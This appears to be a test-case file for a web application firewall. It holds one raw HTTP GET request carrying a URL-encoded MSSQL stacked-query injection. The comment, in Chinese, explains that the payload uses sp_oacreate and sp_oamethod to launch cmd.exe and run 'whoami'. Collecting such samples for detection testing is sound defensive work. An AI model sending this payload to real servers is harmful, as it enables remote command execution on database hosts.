@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506408
+# 攻击者基于堆叠查询，将"declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami'"语句注入到 SQL 查询参数中，使用sp_oacreate 和sp_oamethod 两个功能组件，调用cmd并执行系统命令。
+GET /?id=1%3Bdeclare%20@shell%20int%20exec%20sp_oacreate%20%27wscript.shell%27%2C@shell%20output%20exec%20sp_oamethod%20@shell%2C%27run%27%2Cnull%2C%27c:%5Cwindows%5Csystem32%5Ccmd.exe%20%2Fc%20whoami%27&bid=hd_tag_m8mv23mp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23mp
+RM-PRO-Token: 05a45ad31d63a7b987f25798d20d403e
+RM-PRO-Time: 1742808331728
+User-Agent: curl/7.83.1
+
